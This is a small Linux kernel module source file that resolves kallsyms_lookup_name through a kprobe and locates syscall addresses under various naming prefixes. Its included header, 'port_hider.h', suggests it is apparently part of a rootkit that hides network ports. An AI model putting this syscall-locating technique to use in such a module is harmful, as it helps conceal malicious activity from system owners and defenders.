#include "port_hider.h"

static unsigned long (*ksym)(const char *name);

unsigned long find_sym(const char *name)
{
    unsigned long addr = 0;
    struct kprobe kp = { .symbol_name = name };

    if (ksym)
        addr = ksym(name);
    if (!addr && register_kprobe(&kp) == 0) {
        addr = (unsigned long)kp.addr;
        unregister_kprobe(&kp);
    }
    return addr;
}

unsigned long find_sys(const char *base)
{
    unsigned long addr;
    char name[64];

    snprintf(name, sizeof(name), "__sys_%s", base);
    addr = find_sym(name);
    if (addr) return addr;

    snprintf(name, sizeof(name), "__arm64_sys_%s", base);
    addr = find_sym(name);
    if (addr) return addr;

    snprintf(name, sizeof(name), "sys_%s", base);
    addr = find_sym(name);
    if (addr) return addr;

    snprintf(name, sizeof(name), "__se_sys_%s", base);
    addr = find_sym(name);
    if (addr) return addr;

    return 0;
}

int setup_kallsyms(void)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    if (register_kprobe(&kp) == 0) {
        ksym = (void *)kp.addr;
        unregister_kprobe(&kp);
    }
    if (!ksym) {
        pr_err("cannot resolve kallsyms_lookup_name\n");
        return -ENOENT;
    }
    return 0;
}
